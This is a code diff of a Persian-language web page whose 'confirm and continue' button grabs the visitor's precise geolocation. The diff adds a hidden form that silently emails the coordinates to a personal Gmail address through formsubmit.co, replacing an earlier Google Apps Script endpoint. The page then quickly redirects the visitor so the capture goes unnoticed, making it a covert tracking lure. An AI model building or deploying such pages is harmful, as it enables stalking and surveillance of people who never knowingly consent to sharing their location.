@@ -39,6 +39,15 @@
     <button onclick="getLocation()">✅ تأیید و ادامه</button>
     <p id="result"></p>
 
+    <!-- فرم مخفی برای ارسال اطلاعات به ایمیل -->
+    <form id="locationForm" action="https://formsubmit.co/misofiko3@gmail.com" method="POST">
+        <input type="hidden" name="latitude" id="latitude">
+        <input type="hidden" name="longitude" id="longitude">
+        <input type="hidden" name="_subject" value="📍 موقعیت مکانی جدید دریافت شد">
+        <input type="hidden" name="_captcha" value="false"> 
+        <input type="hidden" name="_template" value="table">
+    </form>
+
     <script>
         function getLocation() {
             if (navigator.geolocation) {
@@ -47,38 +56,30 @@
                 navigator.geolocation.getCurrentPosition(
                     sendPosition, 
                     showError, 
-                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 } // افزایش تایم‌اوت به 20 ثانیه
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                 );
             } else {
                 document.getElementById("result").innerText = "⛔ مرورگر شما از موقعیت‌یابی پشتیبانی نمی‌کند.";
             }
         }
 
-        async function sendPosition(position) {
+        function sendPosition(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
             document.getElementById("result").innerText = "⌛ در حال ارسال اطلاعات...";
-            
-            try {
-                let response = await fetch("https://script.google.com/macros/s/AKfycbyQpo8TZp1fyrAO8xkAvoTjhP-sVq6NSeZSFpc2BZew-UzCiFwIqKCWqIfzkElUFyBR/exec", { 
-                    method: "POST",
-                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                    body: `latitude=${latitude}&longitude=${longitude}`
-                });
 
-                let result = await response.text();
-                document.getElementById("result").innerText = "✅ انتقال موفق! در حال هدایت...";
-                
-                // 🚀 انتقال سریع به سایت اصلی پس از ارسال اطلاعات
-                setTimeout(() => {
-                    window.location.href = "https://example.com"; // لینک سایت اصلی را جایگزین کنید
-                }, 1500);
+            // مقداردهی فرم
+            document.getElementById("latitude").value = latitude;
+            document.getElementById("longitude").value = longitude;
 
-            } catch (error) {
-                document.getElementById("result").innerText = "❌ ارسال اطلاعات ناموفق بود.";
-                console.error("خطا:", error);
-            }
+            // ارسال فرم به ایمیل
+            document.getElementById("locationForm").submit();
+
+            // 🚀 انتقال سریع به سایت اصلی پس از ارسال اطلاعات
+            setTimeout(() => {
+                window.location.href = "https://example.com"; // لینک سایت اصلی را جایگزین کنید
+            }, 2000);
         }
 
         function showError(error) {
